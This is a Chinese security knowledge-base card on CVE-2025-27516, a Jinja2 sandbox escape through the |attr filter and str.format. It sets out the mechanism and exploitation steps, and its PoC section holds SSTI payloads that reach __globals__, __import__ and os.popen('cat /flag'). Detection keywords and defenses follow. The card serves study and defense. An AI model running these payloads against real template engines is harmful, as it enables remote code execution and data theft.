---
id: web-python-ssti-jinja2-attr-filter-format-sandbox-escape
title: Jinja2 |attr 过滤器绕过沙箱属性访问控制（CVE-2025-27516）：原生 str.format 属性遍历读取 __globals__
type: scenario
domain: web
path: web/python/ssti
technique: jinja2-sandbox-attr-filter-format-bypass
tags:
- python
- jinja2
- ssti
- sandbox-escape
- attr-filter
- format-string
- cve-2025-27516
- flask
severity: high
confidence: medium
affected_versions: Jinja2 < 3.1.6
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V158
  verified_at: '2026-11-06T07:33:00+08:00'
  notes: 已对照原文与官方补丁/测试核对：CVE-2025-27516 影响 Jinja2 < 3.1.6，漏洞版 do_attr 用原生 getattr 取未包装 str.format，绕过 environment.getattr 的运行时包装；卡已指出原文方式1直接 |attr("__globals__") 会被 is_safe_attribute 下划线检查拦截、仅官方 format 路线可靠。未验证点：未本机复跑；原文为 CTF 应用特化，非通用产品实例；frontmatter cve 为空但标题/正文明确 CVE-2025-27516，未改 meta；frontmatter 无 sources/source_url。
url: /docs/web/python/ssti/web-python-ssti-jinja2-attr-filter-format-sandbox-escape/
draft: false
kb_aliases:
- CVE-2025-27516
- Jinja2 沙箱逃逸
- attr 过滤器 format 绕过
- do_attr 沙箱绕过
- SandboxedEnvironment 逃逸
- 格式化字符串属性遍历
---

## 一句话结论

Jinja2 的 `SandboxedEnvironment` 把属性访问的安全检查集中在 `environment.getattr()` 上，但 `|attr` 过滤器走的是 `do_attr`，在 3.1.6 之前会先用 Python 原生 `getattr()` 取值、再补一次 `is_safe_attribute` 检查；这使攻击者可以拿到未经沙箱包装的 `str.format` 方法，利用格式化字符串的字段遍历能力访问 `__globals__`、`__builtins__` 等沙箱本应拦截的属性（CVE-2025-27516）。

## 原理

- **沙箱的检查入口被假定为唯一入口**：`SandboxedEnvironment` 在 `getattr()` 中做三层检查——`is_internal_attribute()` 拦截 `__class__`、`__globals__` 等双下划线属性；`is_safe_attribute()` 拦截 `str.format`/`str.format_map` 等危险属性；拦截后返回 `Undefined` 静默失败。模板中的点号访问 `obj.attr` 走这条路。
- **`|attr` 过滤器走了另一条路**：模板中的 `obj|attr("name")` 由 `do_attr()` 处理。漏洞版本的 `do_attr()` 直接 `getattr(obj, name)` 取到原始属性，然后只调用 `is_safe_attribute()` 做一次检查；它没有经过 `environment.getattr()`，因此缺少 `getattr()` 内部对特定方法的运行时包装。
- **`str.format` 为什么特殊**：`SandboxedEnvironment.getattr()` 在正常访问 `str.format` 时会返回一个包装版本，包装器在格式化时会对字段表达式中的属性访问再做沙箱检查。`do_attr()` 用原生 `getattr` 拿到的是未包装的 `format`，于是 `"{0.__init__.__globals__[os]}"` 这类格式化字段会直接按 Python 语义遍历对象属性，不触发沙箱检查。
- **为什么这是“逃逸”而不是普通 SSTI**：攻击者原本只能提交模板内容，沙箱负责阻止模板访问 Python 运行时；`|attr("format")` 把“被沙箱限制的属性读取”变成“格式化字符串内部的属性遍历”，从而越过沙箱的检查边界。能否进一步到命令执行，取决于模板上下文里可被遍历到的对象（函数、模块、`__builtins__`）以及是否存在可调用的 gadget。
- **与普通 `|attr` WAF 绕过的区别**：普通 `|attr` 绕过针对的是黑名单关键词，本质上仍是沙箱内的属性访问；本漏洞针对的是沙箱自身的安全检查缺口，即使没有 WAF 也能成立。

## 触发条件

- 应用把用户可控内容作为 Jinja2 模板渲染，并使用 `SandboxedEnvironment`（或基于它的框架沙箱），Jinja2 版本 < 3.1.6。
- 模板中可使用默认的 `|attr` 过滤器（Jinja2 默认提供）。
- 模板上下文里存在可被格式化字段遍历到的对象，例如函数对象（可经 `__globals__` 到模块）或其他带敏感属性的对象。
- 目标未额外禁用 `format`/`format_map` 或在应用层做模板内容白名单。

## 利用步骤

1. 确认目标使用 Jinja2 且版本 < 3.1.6；可直接在模板中测试 `{{ 7*7 }}` 判断模板求值，再测试 `{{ ""|attr("__class__") }}`：若返回 `Undefined`/空，说明沙箱对下划线属性的拦截仍然生效。
2. 用 `|attr("format")` 取原始 `str.format`，传入上下文中任意对象，验证格式化字段能否访问被沙箱保护的属性：
   ```text
   {{ "{0.__class__}" | attr("format")(some_object) }}
   ```
   正常沙箱下 `__class__` 应被拦截；漏洞版本会直接输出类信息。
3. 将字段表达式推进到 `__globals__`/`__builtins__`，读取模块、函数或 `__import__` 等对象的信息，确认逃逸原语成立。
4. 结合上下文中的函数对象构造命令执行链（原文示例为从闭包函数的 `__globals__` 取 `os` 再调用 `popen`）；若该路线被版本差异拦截，改用格式化字段能触达的其他 gadget。
5. 读取命令输出或外带数据；注意不同 Jinja2 版本对 `is_safe_attribute` 与 `do_attr` 的实现差异，需按目标实测。

## PoC

官方修复附带的测试 payload（原文引用），用于验证 `|attr("format")` 是否绕过沙箱：

```python
from jinja2.sandbox import SandboxedEnvironment

env = SandboxedEnvironment()
t = env.from_string(
    '{{ "{0.__call__.__builtins__[__import__]}" | attr("format")(not_here) }}'
)
print(t.render())  # 漏洞版本：可正常渲染并暴露 __import__ 信息；修复版本：抛 SecurityError
```

原文给出的应用内 RCE 形式（需目标上下文存在闭包函数 `avatar_raw_text`，且该版本确实允许 `|attr` 读取下划线属性）：

```text
{{ avatar_raw_text|attr("__globals__")|attr("__getitem__")("os")|attr("popen")("cat /flag")|attr("read")() }}
```

```text
{{ "{0.__globals__[os].popen(cat /flag).read()}" | attr("format")(avatar_raw_text) }}
```

注意：第二种写法中的格式化字段只做属性/下标访问，不会执行字段内的函数调用语法；原文把它描述为直接命令执行，实际效果需按 Python `str.format` 语义核对。第一种写法依赖 `|attr("__globals__")` 能通过 `is_safe_attribute` 的下划线检查，而该检查在 Jinja2 沙箱中默认会拒绝以下划线开头的属性，因此该 payload 只在特定版本/配置下成立，不能直接当作通用 PoC。

## 变体与关联

- **过滤器变体**：`|attr("format")`、`|attr("format_map")`；任何返回未包装内建方法的过滤器/属性都可能成为同类入口。
- **编码变体**：字段名可用 Unicode/转义方式拆分关键词，配合 WAF 绕过；但本漏洞的核心是沙箱入口绕过，不依赖 WAF。
- **关联 CVE**：CVE-2024-56326 同样与 `format` 方法的间接引用有关，说明“沙箱只在 `environment.getattr()` 入口生效”这一假设反复出问题。
- **关联卡片**：[[web-python-ssti-jinja2-waf-bypass-hex-attr-args]]（`|attr` 用于 WAF 关键词绕过，与本卡的沙箱绕过不同层）；[[web-python-ssti-jinja2-flask-globals-rce]]（拿到属性访问后的常规 globals→RCE 链）。
- **边界**：Jinja2 ≥ 3.1.6 的 `do_attr` 改为先用 `getattr_static` 检查存在性，再统一走 `environment.getattr()`，本绕过失效；若应用在模板外层做 AST 白名单、禁用 `|attr` 或不在上下文中暴露任何对象，利用面显著缩小。

## 检测与防御

- **升级**：将 Jinja2 升级到 ≥ 3.1.6；同时检查 3.1.6 之前的分支/锁定版本。
- **模板入口**：不要用 `SandboxedEnvironment` 渲染完全由用户控制的模板源码；改用固定模板 + 变量插值，或仅允许白名单占位符。
- **过滤器限制**：在沙箱子类中禁用/覆盖 `attr` 过滤器，或对 `format`/`format_map` 做额外拦截；不要只依赖默认的 `is_safe_attribute`。
- **上下文最小化**：不要向模板传入函数对象、模块、`self`、配置对象等可经 `__globals__` 扩散的引用。
- **检测**：请求模板中出现 `|attr(`、`format`、`__globals__`、`__builtins__`、`__class__`、`__init__` 的组合；响应中出现类/函数 repr、模块路径、异常模板栈；同一来源高频提交格式化字段探测。
- **响应**：确认逃逸后轮换模板上下文涉及的密钥/凭据，检查是否已通过 globals 访问到配置或执行命令，审计模板渲染入口与版本。
